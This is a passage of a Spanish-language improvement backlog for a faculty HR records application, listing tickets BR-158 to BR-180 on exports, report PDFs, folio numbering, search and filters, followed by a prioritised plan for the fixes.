Esfuerzo: **M** · Archivos: `app/static/hr.js`, `app/static/hr.html`,
`app/routes/hr.py`

### BR-158 · No hay exportación masiva ni por lotes

`app/static/app.js:381`

**Hoy:** el CSV del cliente exporta la página visible (BR-014). No se puede
exportar todo el resultado de una búsqueda, ni generar los expedientes en PDF de
un departamento entero, ni programar un envío.

**Debe pasar:** exportación en el servidor de todo el conjunto filtrado, en CSV
y en PDF por lotes, con trabajo asíncrono y descarga cuando termine.

Esfuerzo: **L** · Archivos: `app/routes/hr.py`, `app/static/hr.js`

### BR-159 · El reporte del expediente no tiene firma, sello ni verificación

`app/routes/hr.py:588-590`

**Hoy:** el pie dice "Documento generado automáticamente… Confidencial". No hay
espacio para la firma del jefe de RRHH, ni sello, ni número de control, ni
código de verificación. Un expediente impreso hoy no sirve para ningún trámite
oficial: es una lista bonita.

**Debe pasar:** número de control correlativo, código QR o código de
verificación que apunte a un endpoint público de comprobación (la maquinaria de
`share.py` con HMAC ya existe y sirve exactamente para esto), bloque de firma y
sello, y registro de cada emisión.

Esfuerzo: **M** · Archivos: `app/routes/hr.py`, `app/routes/share.py` `[CHOCA]`

### BR-160 · El reporte es HTML con `window.print()`, no un PDF

`app/routes/hr.py:539` · `app/routes/hr.py:513`

**Hoy:** una página con un botón que llama a la impresión del navegador. El
resultado depende del navegador, de los márgenes que tenga configurados el
usuario y de si decide imprimir cabeceras y pies. No se puede archivar, ni
firmar digitalmente, ni adjuntar a un correo.

**Debe pasar:** PDF generado en el servidor, con paginación controlada,
numeración "Página X de Y" y metadatos del documento.

Esfuerzo: **M** · Archivos: `app/routes/hr.py`, `api/requirements.txt` `[CHOCA]`

### BR-161 · El reporte no muestra la foto del empleado

`app/routes/hr.py:549-562`

**Hoy:** doce campos de texto y ninguna foto, cuando la ficha en pantalla la
tiene y el sistema la almacena. Un expediente de personal impreso sin fotografía
no identifica a nadie.

**Debe pasar:** foto embebida (base64, para que el PDF sea autónomo).

Esfuerzo: **S** · Archivos: `app/routes/hr.py`

### BR-162 · El reporte no incluye la antigüedad, la edad ni la elegibilidad de jubilación

`app/routes/hr.py:549-566`

**Hoy:** muestra fechas crudas. Las dos cifras que se usan para decidir (años de
servicio, edad) hay que calcularlas a mano leyendo el papel.

**Debe pasar:** antigüedad, edad y estado de elegibilidad de jubilación
calculados (depende de BR-148).

Esfuerzo: **S** · Archivos: `app/routes/hr.py`

### BR-163 · El reporte no tiene índice ni numeración de folios

`app/routes/hr.py:567-570`

**Hoy:** una sola tabla continua. Un expediente físico se cita por número de
folio; el reporte no numera nada, así que no se puede referenciar "el folio 34
del expediente".

**Debe pasar:** numeración de folios estable por documento y un índice inicial
con las cuatro Partes y sus rangos de folio.

Esfuerzo: **M** · Archivos: `app/routes/hr.py`, `app/main.py` `[CHOCA]`

### BR-164 · La insignia "folios visibles" cuenta documentos, no folios

`app/static/hr.js:363` · `app/static/hr.js:432`

**Hoy:** dice "N folios visibles" contando filas de documento. Un documento
puede tener veinte folios: el modelo de datos del módulo Archivo tiene el campo
(`docs/funcionalidades.md` menciona número de folios y cantidad de páginas). En
un archivo, "folio" es un término técnico con significado preciso y usarlo mal
es peor que no usarlo.

**Debe pasar:** "N documentos", o sumar folios de verdad.

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-165 · Las 4 Partes no muestran qué son ni qué debe ir en cada una

`app/static/hr.js:372-377`

**Hoy:** las pestañas se acortan a "Parte I", "Parte II"… con
`replace(/ — .+/, "")`. Quien no se sabe de memoria la estructura del expediente
—o sea, cualquiera menos las dos personas que llevan años en la oficina— no sabe
dónde buscar. El nombre completo está a mano y se descarta.

**Debe pasar:** nombre completo cuando cabe, `title` cuando no, y un texto de
ayuda por Parte explicando qué documentos alberga.

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-166 · Los documentos "Sin clasificar" se mezclan con las Partes como si fueran una más

`app/static/hr.js:446-448` · `app/static/hr.js:457`

**Hoy:** un documento sin categoría produce el grupo "Sin clasificar", que se
ordena al final (`?? 99`) y se presenta con el mismo aspecto que una Parte
oficial, con su icono de carpeta genérico. Un documento sin clasificar es una
**tarea pendiente de archivo**, no una sección del expediente.

**Debe pasar:** presentarlo como aviso ("3 documentos sin clasificar — revisar"),
con acción de clasificar para quien tenga permiso, y contarlos en un informe.

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-167 · El dossier no tiene línea de tiempo de la vida laboral

`app/static/hr.js:243-369`

**Hoy:** cabecera con datos + documentos agrupados por Parte + historial de
cargos escondido tras un botón. Pero la pregunta que se hace todo el mundo al
abrir un expediente es cronológica: qué pasó y cuándo. Ingreso, ascensos,
permisos, cambios de dedicación, jubilación — hoy están repartidos en tres
sitios y en ninguno se ven juntos.

**Debe pasar:** línea de tiempo como primera vista del dossier, con los
documentos colgando de cada hito.

Esfuerzo: **L** · Archivos: `app/static/hr.js`, `app/static/styles.css`
`[CHOCA]`, `app/routes/hr.py`

### BR-168 · El historial de cargos está escondido tras un botón, plegado por defecto

`app/static/hr.js:320-331`

**Hoy:** hay que saber que existe el botón "Ver historial", pulsarlo, y esperar
una petición. Es el dato más importante del expediente después de la identidad —
y está por debajo de cuatro botones de "documentos de identidad" que las más de
las veces salen deshabilitados.

**Debe pasar:** el cargo actual y los dos anteriores visibles siempre, con "ver
todo"; y llegar en la misma petición del perfil, no en una segunda.

Esfuerzo: **S** · Archivos: `app/static/hr.js`, `app/routes/hr.py`

### BR-169 · La jubilación y la pensión sólo se muestran si la persona ya está retirada

`app/static/hr.js:309-310`

**Hoy:** `isRetirado ? ... : ""`. Escenario: un empleado activo con fecha de
jubilación prevista para dentro de seis meses **no muestra esa fecha** en su
expediente. Es exactamente al revés: la fecha prevista sólo es útil antes de que
llegue. Después es un dato histórico.

**Debe pasar:** mostrar siempre que exista, con el estado ("prevista" /
"efectiva") y los días que faltan.

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-170 · La detección de estado se hace por `includes()` sobre una cadena unida

`app/static/hr.js:252-253` · `app/routes/hr.py:345`

**Hoy:** `statuses` es el resultado de `_join_unique("estado")`, es decir
`"Activo; Jubilado"` si la fusión de homónimos de BR-004 ocurrió, y el frontend
pregunta `.includes("Retirado")`. Un estado que se llamara "No Retirado" daría
verdadero. Es una comparación de texto donde debería haber un identificador.

**Debe pasar:** `estado_id` en la respuesta y comparación por identificador.

Esfuerzo: **S** · Archivos: `app/routes/hr.py`, `app/static/hr.js`

### BR-171 · No hay alerta de expediente sin foto, sin cédula o sin fecha de ingreso

`app/static/hr.js:119-159`

**Hoy:** un expediente al que le falta la cédula se ve igual que uno completo
(sale "C.I: " vacío). No hay ninguna señal de calidad de dato en el listado.

**Debe pasar:** indicador de calidad en la tarjeta y un informe "expedientes con
datos faltantes" (depende de BR-149).

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-172 · No hay guardado de búsquedas ni consultas frecuentes

`app/static/hr.html:133`

**Hoy:** cada vez hay que rehacer los filtros a mano. "Personal jubilable este
año" o "expedientes incompletos de Biología" son preguntas que se hacen todos
los meses.

**Debe pasar:** guardar la búsqueda (con BR-028 ya es casi gratis: es guardar
una URL) y una lista de consultas frecuentes.

Esfuerzo: **M** · Archivos: `app/static/hr.js`, `app/main.py` `[CHOCA]`,
`app/routes/hr.py`

### BR-173 · No hay historial de "consultados recientemente"

`app/static/hr.js:165`

**Hoy:** quien trabaja un expediente a lo largo del día lo busca de nuevo cada
vez. Todos los sistemas de RRHH del mercado tienen la lista de recientes.

**Debe pasar:** lista de los últimos expedientes abiertos por el usuario, en la
pantalla de búsqueda vacía.

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-174 · El buscador no perdona errores tipográficos ni entiende cédulas con formato

`app/routes/hr.py:128-154`

**Hoy:** FTS con `plainto_tsquery` más `ILIKE`. Buscar "V-12.345.678" no
encuentra al empleado cuya cédula está guardada como "12345678", ni al revés;
"Rodriges" no encuentra a "Rodríguez" (el `unaccent` cubre los acentos, no las
faltas). Hay un índice trigram sin usar (`schema.sql:506`) que resolvería la
segunda parte.

**Debe pasar:** normalizar la cédula (quitar puntos, guiones y la letra) en
ambos lados de la comparación, y usar similitud trigram como último recurso con
"¿quiso decir…?".

Esfuerzo: **M** · Archivos: `app/routes/hr.py`, `app/main.py` `[CHOCA]`

### BR-175 · No hay autocompletado en el buscador de personas

`app/static/hr.html:135`

**Hoy:** el módulo Archivo tiene autocompletado (`docs/funcionalidades.md`, punto
1); el buscador de RRHH no. Se escribe a ciegas y se espera al *debounce*.

**Debe pasar:** sugerencias de persona por nombre y cédula, con la foto, y salto
directo al expediente.

Esfuerzo: **M** · Archivos: `app/static/hr.js`, `app/routes/hr.py`,
`app/static/hr.html`

### BR-176 · El buscador no busca dentro de los documentos del expediente

`app/routes/hr.py:132-147`

**Hoy:** la búsqueda global cubre nombre, cargo, departamento, cédula y RIF. No
busca en `titulo`, `notas` ni `abstract` de los documentos, pese a que existe el
índice `idx_datos_rrhh_notas` (`main.py:407`) creado exactamente para eso. Buscar
"beca doctorado" no encuentra al empleado cuyo expediente tiene ese permiso.

**Debe pasar:** incluir el contenido de los documentos en la búsqueda de
personas, indicando por qué salió cada resultado ("coincide en 2 documentos").

Esfuerzo: **M** · Archivos: `app/routes/hr.py`

### BR-177 · No hay filtro por cargo ni por dedicación en el panel de filtros

`app/static/hr.html:47-99`

**Hoy:** tres filtros: Tipología, Fecha y Estado. Falta cargo/categoría
(existe en la vista), departamento (existe, y sólo se llega por la faceta rota
de BR-030), rango de antigüedad, nivel educativo y sexo. Con mil empleados,
tres filtros son pocos.

**Debe pasar:** los filtros que corresponden a las columnas que ya existen, más
los de BR-151 y BR-152 cuando existan.

Esfuerzo: **M** · Archivos: `app/static/hr.html`, `app/static/hr.js`,
`app/routes/hr.py`, `app/models.py` `[CHOCA]`

### BR-178 · Sin acciones en lote sobre los resultados

`app/static/hr.js:119`

**Hoy:** ninguna casilla de selección. Todo se hace de uno en uno.

**Debe pasar:** selección múltiple con acciones: exportar, imprimir, marcar para
revisión (depende de BR-157 y BR-158).

Esfuerzo: **M** · Archivos: `app/static/hr.js`, `app/static/hr.html`

### BR-179 · No hay atajos de teclado

`app/static/hr.js` (ausente)

**Hoy:** nada. `/` para enfocar el buscador y `Escape` para limpiar son el
mínimo que espera quien pasa el día en esta pantalla.

**Debe pasar:** `/` enfoca, `Escape` limpia y cierra, `j`/`k` recorren
resultados, `Enter` abre.

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-180 · No hay ayuda contextual sobre las 4 Partes en la pantalla

`app/static/hr.html` · `app/static/ayuda.html`

**Hoy:** existe `ayuda.html`, pero la pantalla de RRHH no enlaza a la parte que
le corresponde, ni explica en el sitio qué es cada Parte del expediente
(BR-165).

**Debe pasar:** enlace de ayuda contextual, y descripciones al pasar por encima
de las Partes.

Esfuerzo: **S** · Archivos: `app/static/hr.html`, `app/static/hr.js`

---

## Cómo abordarlo

Cuatro bloques, en este orden:

1. **Cerrar la puerta** — BR-001, BR-002, BR-003, BR-006, BR-057. Un fin de
   semana de trabajo y el sistema deja de exponer el fichero de personal de la
   Facultad. Nada más debería tocarse antes que esto.
2. **Los bugs que dan datos equivocados** — BR-004, BR-005, BR-015, BR-016,
   BR-018, BR-031. Son los que hacen que la pantalla mienta.
3. **Sacar los estilos del JavaScript** — BR-109 es el nudo: mientras el dossier
   se pinte con `style` en línea, el modo oscuro, los temas, la densidad y media
   docena de pendientes de accesibilidad no tienen dónde engancharse. Hacerlo
   antes que cualquier trabajo estético, o se hará dos veces.
4. **Convertirlo en un sistema de RRHH** — BR-148 (antigüedad) y BR-149
   (completitud) son los dos que cambian la naturaleza de la herramienta con el
   menor esfuerzo. Los demás de la sección 7 son proyectos con decisión
   institucional detrás.
